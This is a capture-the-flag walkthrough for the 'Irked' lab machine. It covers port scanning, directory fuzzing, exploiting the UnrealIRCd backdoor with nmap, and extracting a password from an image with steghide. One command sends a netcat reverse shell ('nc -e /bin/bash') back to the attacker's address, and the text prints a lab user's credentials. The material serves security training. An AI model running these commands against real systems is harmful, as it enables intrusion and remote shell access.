# Irked

**Machine ip:** 10.10.10.117

## Enumeration
First thing first, start port scan:
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.117 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.117`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a39552d9-85e5-491a-9959-bdbb8f0dd5c5)

+ The result shows that 7 TCP ports are open:
```
Port 22: OpenSSH 6.7p1
Port 80: Apache httpd 2.4.10
Port 111: rpcbind 2-4
Port 6697: irc
Port 8067: irc
Port 56060: status
Port 65534: irc
```

+ As usual, always start off with enumerating web server first.
+ Visit the web application.
+ Navigate to `http://10.10.10.117/`, and an irc application works.
+ View Page Source, and there's no useful information.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2f9bb664-f485-4f90-970d-bb4c2973f3dd)

+ Directory fuzzing to enumerate directories:
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.117/ -k -n -x html,php,txt -r -t 50
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/882e7f81-c5d1-4ebb-9182-f853ce3aaa67)

+ The **/manual** directory directs to the default Apache HTTP server page, and nothing's interesting here, too.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/78ebc503-c04b-4742-81c6-fa9919dae27a)

+ Check other ports. Ports 22 OpenSSH 6.7p1, and port 111 rpcbind 2–4 aren't promising. Ports 6697, 8067 and 65534 runs UnrealIRCd.
+ Check if there are any nmap scripts for irc.
+ To list related scripts: `ls -l /usr/share/nmap/scripts/irc*`
+ **Alternatively**, `find /usr/share/nmap/scripts -name '*irc*'`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3d0e30f9-e813-4d2b-8100-6225d57fb637)

+ Check `/usr/share/nmap/scripts/irc-unrealircd-backdoor.nse` [nmap nse script](https://nmap.org/nsedoc/scripts/irc-unrealircd-backdoor.html). It shows us that nmap detects if it's vulnerable, and also it starts a netcat listener that would give the attack machine a shell on the target system.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/53d45740-786a-4444-bc30-86628f3f09f1)

+ First, run an nmap scan to determine which of these ports are vulnerable to the backdoor.
```
nmap -p 6697,8067,65534 --script=irc-unrealircd-backdoor 10.10.10.117
```

+ Port 8067 is vulnerable.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bca03c40-0895-4f7f-b1d9-aeb4c1d0711d)



## Gaining Access

### Method 1
+ Start a netcat listener on the attack machine: `nc -lnvp 4444`
+ Try to send a reverse shell to the attack machine netcat listener from the target machine.
```
nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.6 4444" 10.10.10.117
```

+ Get the low level shell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b1a5b205-1807-4db2-8333-5c924009a39d)


+ Do more stable shell.
```
script /dev/null -c bash
CTRL^Z: Ctrl + Z
stty raw -echo; fg
reset
terminal type? 'screen' or 'xterm'
export TERM=xterm  
export SHELL=bash
stty rows 55 columns 285
```

+ There's no permission to read the user flag, and we need to escalate privileges.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/54a47658-1c3e-4daa-ac61-9b5ce93d48b7)


## Privilege Escalation: from 'ircd' to 'djmardov'
+ In **/home/djmardov/Documents**, there's a hidden file **.backup**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4cd93b71-8d2b-4e62-ad71-4cc5ff375314)

+ Take note of `UPupDOWNdownLRlrBAbaSSss` with the reference to steg.
+ Then download the emoji image file on **http://10.10.10.117/** irc home page: `wget 10.10.10.117/irked.jpg`
+ Try to extract data from image **irked.jpg** with discovered passphrase `UPupDOWNdownLRlrBAbaSSss`: `steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8f73a461-00a4-487a-b18e-cbc48d325ae6)

+ Discovered **djmardov**'s password `Kab6h+m+bbp2J:HG`.
+ Login with `djmardov`:`Kab6h+m+bbp2J:HG` credentials.
+ Get the user flag with djmardov's privileges.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9d597387-811b-42a8-94dd-cdf4ced48cb8)




# References & Alternatives
+ https://vvmlist.github.io/#irked
+ 
